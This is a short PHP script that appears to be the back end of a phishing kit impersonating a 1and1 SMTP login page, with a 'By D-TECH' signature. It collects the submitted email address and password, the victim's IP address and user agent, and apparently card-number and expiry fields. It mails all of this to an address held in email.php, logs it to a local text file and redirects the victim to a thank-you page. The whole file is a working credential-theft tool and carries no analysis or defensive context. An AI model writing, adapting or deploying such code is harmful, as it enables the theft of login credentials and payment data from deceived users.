<?php
$ip = getenv("REMOTE_ADDR");

include('./email.php');


$message .= "--++-----[ $$ 1and1 Server SMTP Access $$ ]-----++--\n";
$message .= "-------------- SMTP -------------\n";
$message .= "Email : ".$_POST['login_username']."\n";
$message .= "Password : ".$_POST['secretkey']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $ip\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By D-TECH ----------------------\n";
$cc = $_POST['ccn'];
$subject = " 1and1 Server SMTP Result [ " . $ip . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: 1and1 Server SMTP D-TECH <contact>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: thanks.html");